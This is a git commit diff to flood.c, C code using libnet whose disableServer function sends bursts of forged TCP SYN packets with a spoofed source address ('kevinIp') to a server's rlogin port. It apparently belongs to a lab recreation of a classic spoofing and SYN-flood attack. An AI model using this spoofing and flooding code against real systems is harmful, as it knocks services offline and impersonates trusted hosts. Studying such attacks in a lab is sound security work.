172f73fee568c1e7a25cc15902e549c4f636401b
rick <riccardo.iesari@gmail.com>
2020-09-14 16:22:29 +0200

    f

--- flood.c
+++ flood.c
@@ -4,16 +4,16 @@
 #include "sender.h"
 void disableServer(libnet_t *l,u_long kevinIp, u_long serverIp)
 {
-    tcpTagCreate(l,libnet_get_prand(LIBNET_PRu16),(u_int16_t)513,
+
+    for(int i=0; i<10; i++)
+    {   
+        tcpTagCreate(l,libnet_get_prand(LIBNET_PRu16),(u_int16_t)513,
                                     libnet_get_prand(LIBNET_PRu32),libnet_get_prand(LIBNET_PRu32),
                                     "disable", 7,
                                     TH_SYN);
 
-    ipTagCreate(l,(u_int32_t)kevinIp,(u_int32_t)serverIp,
+        ipTagCreate(l,(u_int32_t)kevinIp,(u_int32_t)serverIp,
                                    NULL, (u_int32_t)7 );
-
-    for(int i=0; i<10; i++)
-    {   
         sendPacket(l);
     }
     usleep(200);                   
